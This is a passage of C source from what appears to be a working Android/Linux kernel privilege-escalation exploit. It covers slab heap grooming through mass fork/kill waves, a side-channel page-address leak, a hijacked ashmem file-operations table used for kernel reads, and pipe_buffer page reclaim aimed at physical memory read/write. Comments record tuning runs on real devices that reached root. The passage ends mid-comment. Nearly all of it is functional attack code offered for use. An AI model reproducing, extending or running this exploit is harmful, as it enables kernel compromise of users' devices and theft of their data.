#include "common.h"
#include <poll.h>

#define PIPE_SHAPE_ROUNDS 0
#define PHYSRW_PROOF_OFF 0x7000
#define PHYS_READ_TAG "nebusec_70687973727730"
#define PHYS_WRITE_TAG "nebusec_70687973727731"
#define PHYS64_SEED 0x306365737562656eULL
#define PHYS64_NEXT 0x316365737562656eULL

static int pipe_objects_ready;
static int pipe_fds_n[PIPE_N_COUNT][2];
static int pipe_fds_c[PIPE_C_COUNT][2];
static int pipe_fds_e[PIPE_E_COUNT][2];
static int pipe_fds_drain[PIPE_DRAIN][2];
static int pipe_fds_reclaim[PIPE_RECLAIM][2];

/* Runtime drain/reclaim pipe counts. PIPE_DRAIN/PIPE_RECLAIM stay the
 * array maximums; KS_PIPE_SLABS=<slabs> shrinks the set for callers that
 * cannot raise fs/pipe-user-pages-soft first (postlock triggers the
 * exploit as shell with the stock 16384 soft cap, where the full 64-slab
 * set dies on F_SETPIPE_SZ and pr_error kills the bootstrap sh). Set in
 * prepare before the make loops; the forked prepare child and reset
 * inherit/read the same globals. */
static size_t pipe_drain_cnt;
static size_t pipe_reclaim_cnt;

static void resolve_pipe_counts(void) {
  pipe_drain_cnt = PIPE_DRAIN;
  pipe_reclaim_cnt = PIPE_RECLAIM;
  const char *arg = getenv("KS_PIPE_SLABS");
  if (!arg || !arg[0])
    return;
  char *end = NULL;
  unsigned long long slabs = strtoull(arg, &end, 0);
  if (!end || *end || slabs < 1) {
    pr_warning("bad KS_PIPE_SLABS value=%s; using full drain=%zu\n", arg,
               pipe_drain_cnt);
    return;
  }
  if (slabs > PIPE_DRAIN_SLABS)
    slabs = PIPE_DRAIN_SLABS;
  size_t rslabs = slabs;
  if (rslabs > PIPE_RECLAIM_SLABS)
    rslabs = PIPE_RECLAIM_SLABS;
  pipe_drain_cnt = (size_t)slabs * PIPE_OBJS_PER_SLAB;
  pipe_reclaim_cnt = rslabs * PIPE_OBJS_PER_SLAB;
  pr_info("pipe counts via KS_PIPE_SLABS drain=%zu reclaim=%zu\n",
          pipe_drain_cnt, pipe_reclaim_cnt);
}

pid_t pipe_prepare_child = -1;
uint64_t kmalloc_pipe_cache;
uint64_t kmalloc_normal_1k_cache;
uint64_t kmalloc_normal_2k_cache;
uint64_t kmalloc_cgroup_1k_cache;
uint64_t kmalloc_cgroup_2k_cache;
uint64_t candidate_slab_cache;
int pipe_cache_gate_ok;
int pipe_cache_page_index = -1;
int pipe_cache_slot_hit = -1;
uint64_t pipe_page_slab_cache[PIPE_CANDIDATE_PAGES];
uint32_t pipe_page_type[PIPE_CANDIDATE_PAGES];
uintptr_t pipebuf_page_base;
uintptr_t pipebuf_addr;
int pipebuf_pipe_idx = -1;
char physrw_readback[64];
char physrw_after_write[64];
int physrw_read_ok;
int physrw_write_ok;
int pipe_scan_vmemmap;
int pipe_scan_ops;
int pipe_scan_len;
int pipe_probe_found;
uint64_t pipe_probe_page;
uint64_t pipe_probe_ops;
uint64_t pipe_probe_private;
uint32_t pipe_probe_len;
uint32_t pipe_probe_flags;
uint64_t pipe_scan_first_page;
uint64_t pipe_scan_first_ops;
uint64_t pipe_scan_q0;
uint64_t pipe_scan_q1;
uint64_t pipe_scan_q2;
uint64_t pipe_scan_q3;
uint32_t pipe_scan_first_len;
uint32_t pipe_scan_first_flags;
uint32_t pipe_scan_first_offset;
uint64_t pipe_scan_first_private;
uint64_t physrw_read64_before;
uint64_t physrw_read64_after;
uint64_t physrw_write64_value;
int physrw_read64_ok;
int physrw_write64_ok;

void init_ctx(struct mm_ctx *ctx, size_t cnt) {
  ctx->mm_cnt = cnt;
  ctx->childs = calloc(sizeof(pid_t), cnt);
  ctx->memfds = calloc(sizeof(int), cnt);
}

void resize_pipe_slots(int pipefd[2], size_t slots) {
  SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE));
}

uint64_t read_target_slab_cache(int fd, uintptr_t base) {
  uintptr_t head = direct_to_head_page(fd, base);
  if (!head) {
    return 0;
  }
  return kernel_read64(fd, head + STRUCT_SLAB_CACHE_OFF);
}

void make_pipe_object(int pipefd[2]) {
  SYSCHK(pipe(pipefd));
  resize_pipe_slots(pipefd, 2);
}

void alloc_pipe_object(int pipefd[2]) {
  resize_pipe_slots(pipefd, PIPE_BUFFER_SLOTS);
}

void free_pipe_object(int pipefd[2]) {
  resize_pipe_slots(pipefd, 2);
}

void shape_pipe_cache_once(void) {
  for (size_t i = 0; i < PIPE_N_COUNT; i++) {
    alloc_pipe_object(pipe_fds_n[i]);
  }
  for (size_t i = 0; i < PIPE_C_COUNT; i++) {
    alloc_pipe_object(pipe_fds_c[i]);
  }
  for (size_t i = 0; i < PIPE_E_COUNT; i++) {
    alloc_pipe_object(pipe_fds_e[i]);
  }
  for (size_t i = 0; i < PIPE_N_COUNT; i += PIPE_OBJS_PER_SLAB) {
    free_pipe_object(pipe_fds_n[i]);
  }
  for (size_t i = 0; i < PIPE_E_COUNT; i++) {
    free_pipe_object(pipe_fds_e[i]);
  }
  for (size_t i = 0; i < PIPE_C_COUNT; i += PIPE_OBJS_PER_SLAB) {
    free_pipe_object(pipe_fds_c[i]);
  }
}

void shape_pipe_cache(void) {
  for (int round = 0; round < PIPE_SHAPE_ROUNDS; round++) {
    for (size_t i = 0; i < PIPE_N_COUNT; i++) {
      free_pipe_object(pipe_fds_n[i]);
    }
    for (size_t i = 0; i < PIPE_C_COUNT; i++) {
      free_pipe_object(pipe_fds_c[i]);
    }
    for (size_t i = 0; i < PIPE_E_COUNT; i++) {
      free_pipe_object(pipe_fds_e[i]);
    }
    shape_pipe_cache_once();
  }
}

/*
 * The fake-fops table page is read through the payload channel itself, and
 * the page can be TRANSIENTLY OFFLINE for a few ms (page-cache eviction /
 * migration — the win loop's full-table re-read was written for exactly
 * this, see "transiently offlined" there).  Every "one failed read == page
 * dead" gate below used to fire on that blip and abort the whole route;
 * today's deterministic early-death mode was exactly it (round1: win enter
 * q0=1 nonce ok — payload provably alive — then every later attempt's
 * precheck read rv=-1/-1/-1 looped straight to DONE).  Poll until the
 * expected value appears; a truly dead page (skb purged, page reused with
 * non-zero garbage) fails every try — and cannot panic worse than it
 * already would on the first read (NULL ioctl slot returns ENOTTY).
 */
static int ks_fetch64_expect(uintptr_t addr, uint64_t want, uint64_t *out,
                             int tries) {
  uint64_t last = 0;
  int last_rv = -1;
  for (int i = 0; i < tries; i++) {
    uint64_t v = 0;
    int rv = ks_fetch64(addr, &v);
    last_rv = rv;
    last = v;
    if (rv >= 0 && v == want) {
      *out = v;
      return rv;
    }
    if (i + 1 < tries)
      usleep(20000);
  }
  *out = last;
  return last_rv;
}

uintptr_t prepare_pipe_buffer_page_child(void) {
  struct mm_ctx prep;
  struct mm_ctx spray;
  struct mm_ctx pre;
  struct mm_ctx post;
  size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;

  /*
   * mm_struct objects are allocated by this thread inside its own clone
   * syscalls, so the slab cache cpu (and the active slab it rotates) is
   * decided here.  Pin before the first fork; otherwise a mid-spray migration
   * strands the target page on another cpu where the waves below can never
   * reach it.
   */
  pin_to_core(CORE);

  /* chain9: the payload table can already be dead when we fork (the
   * window starts before the child); every cfgfs op below would jump it.
   * Fail the prepare instead — the parent's post-prepare check aborts. */
  {
    uint64_t tbl = 0;
    uint64_t want = (uint64_t)text_addr(ASHMEM_IOCTL);
    int tr = ks_fetch64_expect(fops_table_base() + FOPS_IOCTL_OFF, want, &tbl,
                               150);
    if (tr < 0 || tbl != want) {
      pr_warning("pipe child payload table dead at start tbl=%llx rv=%d; "
                 "failing prepare\n",
                 (unsigned long long)tbl, tr);
      return 0;
    }
  }

  init_ctx(&prep, 32 * objs_per_slab);
  init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
  init_ctx(&pre, objs_per_slab - 1);
  init_ctx(&post, objs_per_slab);
  pr_info("pipe child ctx prep=%zu spray=%zu pre=%zu post=%zu objs=%zu\n",
          prep.mm_cnt, spray.mm_cnt, pre.mm_cnt, post.mm_cnt, objs_per_slab);

  for (size_t i = 0; i < prep.mm_cnt; i++) {
    prep.childs[i] = -1;
    prep.memfds[i] = clone_memfd();
  }
  pr_info("pipe child prep memfds done\n");
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    spray.childs[i] = -1;
    spray.memfds[i] = clone_memfd();
  }
  pr_info("pipe child spray memfds done\n");

  setup_kernelsnitch();
  pr_info("pipe child kernelsnitch setup done\n");

  /* Groom the CORE mm_struct slab right before the pre+leak sequence.  The
   * pre storm is sized objs_per_slab-1 and leak_child fills the 34th slot:
   * the design wants one FRESH page whose every slot is chain-owned, so the
   * pre/leak kill below empties that page completely and the wave sweep can
   * push it back to the buddy (771b7409 evidence: waves=2 taken=1 owned=1
   * -> root=1).  Starting the pre storm on a half-full page instead -- boot
   * -time system/app forks interleave foreign long-lived mm_structs into
   * the active cpu slab -- straddles two pages, leak_child lands elsewhere,
   * and after the kill the leaked page keeps its foreign objects forever
   * (forensics: inuse=34 objects=34 frozen=0, sc identical across 24 waves,
   * owned=0 on 19 rounds over two boots; nothing the wave can kill, since
   * those holders are other processes' mms).
   *
   * Fork-and-kill a burst first: it fills every free slot of the active
   * page plus the cpu partial chain (spray puts MM_PARTIALS pages there), so
   * the last groomed page ends up the active one -- entirely groom-owned
   * (its slots all free again after the kill) -- and put_cpu_partial is
   * LIFO, so whatever page the pre storm pulls is a groom page too.  The
   * pre+leak pair then fills a chain-only page; foreign forks can only
   * interleave inside the ~2ms pre storm window instead of seeding the
   * start page outright. */
  {
    size_t groom_n = (size_t)(MM_PARTIALS + 2) * objs_per_slab;
    pid_t *gp = calloc(groom_n, sizeof(pid_t));
    SYSCHK(gp);
    for (size_t i = 0; i < groom_n; i++)
      gp[i] = clone_child();
    for (size_t i = 0; i < groom_n; i++) {
      kill_child(gp[i]);
      gp[i] = 0;
    }
    free(gp);
    pr_info("pipe child slab groom done n=%zu\n", groom_n);
  }

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    pre.childs[i] = -1;
    pre.memfds[i] = clone_memfd();
  }
  pr_info("pipe child pre memfds done\n");
  pid_t leak_child = clone_leak_child();
  pr_info("pipe child leak_child=%d\n", (int)leak_child);
  /* Open the memfd first while the child is still alive (before it
   * _exit's after find_collisions).  After exit the mm is gone and
   * /proc/PID/mem cannot be opened. */
  int leak_memfd = open_memfd(leak_child);
  pr_info("pipe child leak_memfd=%d\n", leak_memfd);
  /* Wait for find_collisions before the post-memfd fork storm:
   * clone_memfd() forks repeatedly and pollutes the leak child's
   * timing-sensitive futex measurements, producing false-positive
   * collisions whose hash buckets no real mm_struct satisfies
   * (scan found=0).  The shared state is MAP_SHARED so the child's
   * state store is visible here.  The child may already be a zombie
   * by now; open_memfd above already holds the fd. */
  {
    int spins = 0;
    while (!kernelsnitch_collisions_done()) {
      if (++spins > 100000000) {
        pr_warning("pipe child collision wait spun out spins=%d\n", spins);
        break;
      }
      if ((spins & 0xfff) == 0) {
        sched_yield();
      }
    }
    pr_info("pipe child collision wait done done=%d spins=%d child=%d\n",
            kernelsnitch_collisions_done(), spins, (int)leak_child);
  }
  for (size_t i = 0; i < post.mm_cnt; i++) {
    post.childs[i] = -1;
    post.memfds[i] = clone_memfd();
  }
  pr_info("pipe child post memfds done\n");

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    kill_child(pre.childs[i]);
  }
  for (size_t i = 0; i < post.mm_cnt; i++) {
    kill_child(post.childs[i]);
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    kill_child(spray.childs[i]);
  }
  SYSCHK(waitpid(leak_child, NULL, 0));

  if (!kernelsnitch_collisions_ready()) {
    pr_error("pipe KernelSnitch collision finding failed\n");
  }

  unsigned char *buf = malloc(SKB_SEND_SIZE);
  memset(buf, 0x50, SKB_SEND_SIZE);

  int skb_sv[2];
  int pcp_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, skb_sv));
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_sv[0], &msg, 0));
  pin_to_core(CORE);

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < pre.mm_cnt; i++) {
    SYSCHK(close(pre.memfds[i]));
  }
  for (size_t i = 0; i < post.mm_cnt - 1; i++) {
    SYSCHK(close(post.memfds[i]));
  }
  for (size_t i = 0; i < spray.mm_cnt; i += objs_per_slab) {
    SYSCHK(close(spray.memfds[i]));
  }
  SYSCHK(close(pcp_sv[0]));
  SYSCHK(close(pcp_sv[1]));

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(leak_memfd));
  SYSCHK(sendmsg(skb_sv[0], &msg, 0));

  run_kernelsnitch_bruteforce();
  uintptr_t leaked = cleanup_kernelsnitch();
  if (leaked == (uintptr_t)-1) {
    pr_error("pipe KernelSnitch sk_buff page leak failed\n");
  }
  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
  pr_info("pipe prepare leaked=%016zx base=%016zx\n", leaked, base);

  /*
   * Convert the target page into buddy-LIFO top before the pipe reclaim:
   *
   * - While the page is still an mm slab (frozen active or on a partial list),
   *   fork waves of mm objects.  A wave sized beyond one slab forces the
   *   active slab off the cpu slot; killing the wave then empties and
   *   discards the target page.
   * - While the page already sits in the buddy, waves eat the order-3 pages
   *   stacked above it (held alive, never freed); the wave that lands on the
   *   target itself is killed immediately, which puts the target back on top
   *   of the buddy with nothing of ours above it.
   *
   * After that the drain/reclaim pipes poll the page: whatever pipe
   * allocation flips it out of the buddy owns it, and we stop as soon as it
   * holds marker-carrying reclaim pipes.
   */
  int conv_fd = -1;
  /* Re-check right before the cfgfs phase: chain9's content death landed
   * early in the window, and the kernelsnitch leak above takes seconds —
   * a mid-window flip must fail the prepare, not panic in conv SET_NAME. */
  {
    uint64_t tbl_conv = 0;
    /* single-shot read here used to kill the whole prepare on a fresh-boot
     * offline blip (three-run ENOTTY streak: window dead at +.3s, child
     * dead before conv); poll with a seconds-scale grace like the rest. */
    int tr_conv = ks_fetch64_expect(fops_table_base() + FOPS_IOCTL_OFF,
                                    (uint64_t)text_addr(ASHMEM_IOCTL),
                                    &tbl_conv, 150);
    if (tr_conv < 0 || tbl_conv != (uint64_t)text_addr(ASHMEM_IOCTL)) {
      pr_warning("pipe child payload table dead before conv tbl=%llx rv=%d; "
                 "failing prepare\n",
                 (unsigned long long)tbl_conv, tr_conv);
      close(skb_sv[0]);
      close(skb_sv[1]);
      free(buf);
      return 0;
    }
  }
  if (g_fops_probe_fd >= 0) {
    /* misc.fops is restored to the original by now, so a fresh open would
     * get plain ashmem fops and configfs reads would silently EOF.  Dup the
     * cfi fd instead: its f_op snapshot still carries the hijacked table. */
    conv_fd = fcntl(g_fops_probe_fd, F_DUPFD_CLOEXEC, 10);
    pr_info("child conv dup fd=%d probe_fd=%d\n", conv_fd, g_fops_probe_fd);
  } else {
    pr_info("child conv opening\n");
    conv_fd = open_ashmem_device();
    pr_info("child conv opened fd=%d\n", conv_fd);
  }
  {
    char tn[64];
    memset(tn, 'a', sizeof(tn) - 1);
    tn[sizeof(tn) - 1] = 0;
    int lfd = cfgfs_lock();
    errno = 0;
    int tr = ioctl(conv_fd, ASHMEM_SET_NAME, tn);
    int tn_errno = errno;
    cfgfs_unlock(lfd);
    errno = tn_errno;
    pr_info("child conv fd=%d set=%d errno=%d\n", conv_fd, tr, errno);
  }
  /* CONVERT_HOLD_WAVES=1 (per-wave kill): the batch-6 mode is a
   * structural failure per the five-word forensics -- after
   * batch kill sent=660 reaped=660 werr=0 the target page's
   * +20 freelist stays NULL and inuse stays 34 for all 24 waves
   * (the 34 objects are never freed, so the discard wave never
   * happens).  The 771b7409 success (waves=2 taken=1 owned=1) ran
   * the per-wave mode.  Per-wave also doubles as the decisive
   * experiment: the w=1 wavehead read right after kill(wave[0])
   * shows whether wave[0]'s mms actually live on the target page
   * (freelist moves / inuse drops / tsc==0 => yes and the free
   * path works; page frozen at inuse=34 => the fillers are NOT
   * wave mms). */
  enum { CONVERT_MAX_WAVES = 24, CONVERT_HOLD_WAVES = 1 };
  size_t wave_sz = 3 * objs_per_slab + 8;
  pid_t *wave_pids = calloc(CONVERT_MAX_WAVES * wave_sz, sizeof(pid_t));
  int waves_used = 0;
  int taken_wave = -1;
  int target_owned = 0;
  uint64_t tsc = 0;
  /* app-domain stall guard (round11 hang): the target page frozen on a
   * per-cpu slab (inuse=0 frozen=1) never flips -- 24 waves x ~110 clones
   * burn ~2600 forks per prepare round while the route's dangling waiter is
   * live, feeding PI-chain walks until the whole device locks up.  With
   * KS_WAVE_FLAT_MAX=N (>0) abort the wave loop after N consecutive waves
   * whose sc2 == tsc (zero rotation progress).  Default 0 = legacy full
   * 24-wave sweep (shell-domain behaviour unchanged). */
  int flat_max = 0;
  const char *flat_env = getenv("KS_WAVE_FLAT_MAX");
  if (flat_env && flat_env[0])
    flat_max = atoi(flat_env);
  int sc_flat = 0;
  /* Rotate the sweep across every online CPU (deterministic owned=0 fix).
   * Each wave's clone allocates its mm_struct on the CPU this thread is
   * pinned to (copy_process runs inline in the syscall), so pinning the
   * whole loop to CORE only ever drained CPU0's per-cpu freelist.  A
   * target page frozen on another CPU's cpu slab (diagnosis: inuse=0
   * frozen=1, sc identical across 24 waves x 12 rounds, owned=0 every
   * round) never moved -- deterministic failure, not SLUB luck.  Rotating
   * forces each cpu slab to be drained/rotated until the target page
   * unfreezes back to the buddy (read_target_slab_cache -> 0).
   * clone_child's own pin_to_core(CORE) runs after the alloc, so it does
   * not undo this.
   *
   * Two guards from the first field run of this rotation: the chain
   * inherits an affinity narrower than its cpuset (adb shell mask was
   * 0xcf = cpus 0-3,6,7) so a SYSCHK pin to cpu=4 died with EINVAL ->
   * exit(255) -> "pipe prepare child DIED status=65280" at wave[4] with
   * only wave[0..3] logged.  So (1) open the mask back up to the full
   * cpuset first -- reset_cpu_pin is re-narrowed by the cgroup, never
   * EINVAL -- and (2) pin non-fatally: an unavailable cpu only warns and
   * the sweep keeps going on the last good pin. */
  int wave_ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
  if (wave_ncpu < 1)
    wave_ncpu = 1;
  reset_cpu_pin();
  /* Pre-sweep page check: a FULL page (inuse == objects, frozen=0) is
   * structurally stuck and no wave can ever rotate it.  The pre/leak kill
   * already released every chain-owned mm on that page, so the remaining
   * inuse objects are foreign long-lived mm_structs (boot-era app/system
   * forks that interleaved into the target page while the chain's fork
   * storm churned the shared cpu slab -- foreign forks cannot be
   * prevented, only out-lucked).  A full page is off every freelist, so
   * the wave's clone allocations never touch it; 24 waves x 110 clones
   * (~30s of fork storm on top of a live route) always end owned=0
   * (forensics: 5/5 groom rounds, inuse=34 objects=34 frozen=0, sc
   * identical across every wave).  Fast-fail instead: the parent's retry
   * re-rolls a fresh leak_child page (bruteforce re-runs each attempt),
   * and skipping the sweep makes each roll ~30s cheaper -- multiplying
   * the rolls per boot.  Only the FULL state is fatal: the 771b7409
   * success (waves=2 taken=1 owned=1 -> root=1) started from a
   * NON-full page, so partial/frozen pages must still sweep. */
  {
    uintptr_t pre_head = direct_to_head_page(conv_fd, base);
    uint64_t pre_meta = kernel_read64(conv_fd, pre_head + 0x28);
    unsigned pre_inuse = (unsigned)(pre_meta & 0xffffu);
    unsigned pre_objs = (unsigned)((pre_meta >> 16) & 0x7fffu);
    int pre_frozen = (int)((pre_meta >> 31) & 1u);
    pr_info("pipe pre-sweep meta head=%016zx inuse=%u objects=%u frozen=%d\n",
            pre_head, pre_inuse, pre_objs, pre_frozen);
    if (pre_inuse >= pre_objs && pre_frozen == 0) {
      pr_warning("pipe prepare: target page full (%u/%u, foreign holders); "
                 "abort before waves\n", pre_inuse, pre_objs);
      free(wave_pids);
      return 0;
    }
  }
  for (int w = 0; w < CONVERT_MAX_WAVES; w++) {
    cpu_set_t wcpu;
    CPU_ZERO(&wcpu);
    CPU_SET(w % wave_ncpu, &wcpu);
    if (sched_setaffinity(0, sizeof(wcpu), &wcpu) != 0)
      pr_warning("pipe convert wave[%d] pin cpu=%d failed errno=%d; keep last pin\n",
                 w, w % wave_ncpu, errno);
    tsc = read_target_slab_cache(conv_fd, base);
    /* per-wave inuse trace: pre-sweep reads 0, the first post-kill read is
     * 34 and never moves -- pin down WHICH wave fills the page and whether
     * the batch kill's waitpid actually emptied it (0 at w=6 means kill
     * worked and something refilled before w=6 fork; 34 at w=6 start means
     * the kill freed nothing). */
    {
      uintptr_t ph = direct_to_head_page(conv_fd, base);
      if (ph) {
        /* full 5-word slab metadata dump: cross-check which offset really
         * holds counters/freelist/slab_cache (STRUCT_SLAB_CACHE_OFF vs the
         * 5.4 layout) and whether the freelist word moves after a batch
         * kill -- inuse==34 across reaped=660 is a logic contradiction
         * unless the +0x20 freelist proves objects never freed. */
        uint64_t w08 = kernel_read64(conv_fd, ph + 0x08);
        uint64_t w10 = kernel_read64(conv_fd, ph + 0x10);
        uint64_t w18 = kernel_read64(conv_fd, ph + 0x18);
        uint64_t w20 = kernel_read64(conv_fd, ph + 0x20);
        uint64_t w28 = kernel_read64(conv_fd, ph + 0x28);
        pr_info("pipe wavehead w=%d tsc=%016llx head=%016zx "
                "+08=%016llx +10=%016llx +18=%016llx +20=%016llx +28=%016llx "
                "inuse=%u frozen=%d taken=%d\n",
                w, (unsigned long long)tsc, ph, (unsigned long long)w08,
                (unsigned long long)w10, (unsigned long long)w18,
                (unsigned long long)w20, (unsigned long long)w28,
                (unsigned)(w28 & 0xffffu), (int)((w28 >> 31) & 1u),
                taken_wave);
      }
    }
    if (tsc == 0 && taken_wave >= 0) {
      target_owned = 1;
      break;
    }
    /* Two slabs per wave (68): the first 34 fill the chain-head page
     * (the target when this wave's cpu happens to own it -- forensics
     * show the target page's owning cpu is lottery per attempt: the
     * 110-wide waves caught it on cpu0 and leaked; the 34-wide waves
     * never touched it), the second 34 deactivate that full page off
     * the cpu slot so it lands on the NODE partial list where the
     * empty-slab accumulation can actually discard it.  A single 34
     * only cycles fill/empty on the same cpu slab forever (g20: 24
     * waves of inuse=0, sc never 0 -- the page stayed a frozen cpu
     * slab).  Live time ~110ms stays far under the ~1s window where
     * the permanent mmgrab holder claims mms (g14). */
    size_t wave_n = 2 * objs_per_slab;
    for (size_t i = 0; i < wave_n; i++) {
      wave_pids[w * wave_sz + i] = clone_child();
    }
    waves_used = w + 1;
    uint64_t sc2 = read_target_slab_cache(conv_fd, base);
    pr_info("pipe convert wave[%d] n=%zu sc=%016llx cpu=%d\n", w, wave_n,
            (unsigned long long)sc2, w % wave_ncpu);
    if (sc2 != 0) {
      /* decisive read: five-word state BETWEEN the wave's forks and the
       * kill.  inuse==34 here => the wave's mms DID land on the target
       * page and the kill that follows must free them (page should empty;
       * it never does => the mms are not the page's occupants or free is
       * blocked).  inuse==0 here => the wave never touched this page and
       * the w+1满ness arrives from somewhere else entirely. */
      {
        uintptr_t ph3 = direct_to_head_page(conv_fd, base);
        if (ph3) {
          uint64_t f20 = kernel_read64(conv_fd, ph3 + 0x20);
          uint64_t f28 = kernel_read64(conv_fd, ph3 + 0x28);
          pr_info("pipe wavepostfork w=%d +20=%016llx +28=%016llx inuse=%u frozen=%d\n",
                  w, (unsigned long long)f20, (unsigned long long)f28,
                  (unsigned)(f28 & 0xffffu), (int)((f28 >> 31) & 1u));
        }
      }
      /*
       * Serial kill_child per wave -- the exact chain5 (771b7409) success
       * mode (waves=2 taken=1 owned=1 ran 80a92409's code: per-wave
       * kill_child).  The two-phase batch kill (bef0f86d onward) has ONLY
       * failing records: five-word forensics shows wavepostfork w=0
       * inuse=34 (the wave's mms DID land on the target page), then
       * reaped=660 with +20 freelist staying NULL and inuse frozen at 34
       * forever -- the mm_structs were never kmem_cache_freed.  Same
       * SIGKILL+waitpid semantics, but every serial-kill precedent (pre's
       * clone_memfd x33, pre/post/spray sweeps, chain5's wave kills) DID
       * empty pages (pre-sweep always reads inuse=0).  The serial path
       * kills+reaps one pid at a time so each child's exit_mm completes
       * before the next SIGKILL; the two-phase burst fires all SIGKILLs
       * within us and 110 concurrent do_exit/exit_mm runs apparently lose
       * the free somewhere (mm_count/mmu_notifier race window under
       * concurrency).  Restore the proven pattern verbatim. */
      if ((w + 1) % CONVERT_HOLD_WAVES == 0) {
        /* Two-phase SIGKILL-then-reap with the 68-wide wave: live time
         * collapses to the fork burst alone (~50ms; the serial
         * kill_child added ~30ms of staggered waiting on top and 68's
         * serial round STILL leaked every object -- killpost inuse=34
         * frozen=1 forever at g2/821c25c1).  Leak window now pinned
         * between pre's clone_memfd (~1ms, never leaks) and ~110ms
         * (always leaks); 50ms is the next rung down.  If this leaks
         * too the verdict is "any mm held past a few ms is claimed" and
         * the convert route must switch away from mm_struct pages. */
        int kill_sent = 0, reaped = 0, werr = 0, rel_ok = 0, rel_miss = 0;
        for (int k = w + 1 - CONVERT_HOLD_WAVES; k <= w; k++)
          for (size_t i = 0; i < wave_sz; i++)
            if (wave_pids[k * wave_sz + i]) {
              if (kill(wave_pids[k * wave_sz + i], SIGKILL) == 0)
                kill_sent++;
            }
        for (int k = w + 1 - CONVERT_HOLD_WAVES; k <= w; k++) {
          for (size_t i = 0; i < wave_sz; i++) {
            if (wave_pids[k * wave_sz + i]) {
              pid_t wp = wave_pids[k * wave_sz + i];
              if (waitpid(wp, NULL, 0) > 0)
                reaped++;
              else
                werr++;
              /* Drop the mmgrab pin: purge the queued /proc/pid/mem fd
               * this child handoff'd (never recv'd) so its mm_struct
               * actually frees.  Without this the reap leaves mm_count
               * pinned and inuse stays 34 forever (see
               * release_child_handoff in util.c). */
              if (release_child_handoff(wp) > 0)
                rel_ok++;
              else
                rel_miss++;
              wave_pids[k * wave_sz + i] = 0;
            }
          }
        }
        pr_info("pipe batch kill w=%d sent=%d reaped=%d werr=%d rel=%d/%d\n",
                w, kill_sent, reaped, werr, rel_ok,
                rel_ok + rel_miss);
        taken_wave = w;
        /* The just-killed children's mm_structs are not always reclaimed
         * by the time waitpid returns (TLB/RCU/memcg tail), and every
         * failing round read inuse=34 the instant it looked -- so the page
         * can still hold all 34 objects long after the kill.  Poll tsc
         * with NO fork running (nothing can refill) for up to 2s; a zero
         * means the page reached the buddy and the next iteration claims
         * it.  Round771b7409 succeeded with a ~30s gap between its kill
         * (groom) and its first tsc read -- this reproduces that gap at
         * the batch boundary.  Reads here are page-descriptor only
         * (proven safe); never derived pointers. */
        /* killpoll forensics retired (verdict closed: permanent leak --
         * inuse frozen at 34 across a full 10s window at g14/77aa4ef7).
         * One cheap read for the record, no polling stall. */
        {
          uintptr_t hd = direct_to_head_page(conv_fd, base);
          uint64_t w28 = hd ? kernel_read64(conv_fd, hd + 0x28) : 1;
          uint64_t w20 = hd ? kernel_read64(conv_fd, hd + 0x20) : 0;
          pr_info("pipe killpost w=%d inuse=%u +20=%016llx hd=%d\n", w,
                  (unsigned)(w28 & 0xffffu), (unsigned long long)w20,
                  hd ? 1 : 0);
        }
        {
          uint64_t t2 = read_target_slab_cache(conv_fd, base);
          uintptr_t hd = direct_to_head_page(conv_fd, base);
          /* hd==0 guard: if the RCU wait actually caught the discard the
           * page is no longer a slab -- reading hd+0x28 then derefs
           * 0x28 in the kernel (panic, not benign failure). */
          if (hd) {
            uint64_t mt = kernel_read64(conv_fd, hd + 0x28);
            uint64_t fr = kernel_read64(conv_fd, hd + 0x08);
            pr_info("pipe post-kill rcu wait w=%d head=%016zx tsc=%016llx "
                    "inuse=%u frozen=%d freelist=%016llx\n", w, hd,
                    (unsigned long long)t2,
                    (unsigned)(mt & 0xffffu), (int)((mt >> 31) & 1u),
                    (unsigned long long)fr);
          } else {
            pr_info("pipe post-kill rcu wait w=%d tsc=%016llx head=0 "
                    "(page left slab)\n", w, (unsigned long long)t2);
          }
        }
      }
    } else if (sc2 != tsc) {
      /* sc2 hit 0 while tsc was non-zero: the fork sweep pushed the target
       * out of the slab on this very wave, so the batch kill was skipped
       * (it only arms under sc2 != 0) and taken stayed -1 -- forensics
       * wave[5]: n=110 sc=0 followed by 16 waves of tsc==0 that never
       * claimed ownership.  Record the transition; the next iteration
       * re-reads tsc and owned fires only if the zero sticks. */
      taken_wave = w;
    }
    /* else: wave consumed a buddy page above the target; hold it out. */
    if (sc2 == tsc) {
      if (flat_max > 0 && ++sc_flat >= flat_max) {
        pr_warning("pipe convert wave flat x%d sc=%016llx unchanged; "
                   "aborting wave loop\n", sc_flat,
                   (unsigned long long)sc2);
        break;
      }
    } else {
      sc_flat = 0;
    }
  }
  /* Flush any held tail batch (when CONVERT_MAX_WAVES is not a multiple
   * of CONVERT_HOLD_WAVES) so no wave child outlives the sweep; the
   * owned re-check below then sees the post-flush page state. */
  for (int k = 0; k < CONVERT_MAX_WAVES; k++) {
    for (size_t i = 0; i < wave_sz; i++) {
      if (wave_pids[k * wave_sz + i]) {
        pid_t wp = wave_pids[k * wave_sz + i];
        kill_child(wp);
        release_child_handoff(wp);
        wave_pids[k * wave_sz + i] = 0;
      }
    }
  }
  pin_to_core(CORE);
  if (!target_owned && taken_wave >= 0 &&
      read_target_slab_cache(conv_fd, base) == 0) {
    target_owned = 1;
  }
  pr_info("pipe convert waves=%d taken=%d owned=%d sc=%016llx\n", waves_used,
          taken_wave, target_owned, (unsigned long long)tsc);
  if (!target_owned && tsc != 0) {
    /* app-domain diagnosis: the target page never left the slab across all
     * waves (round8: sc identical for 24 waves x 8 rounds).  Read the slab
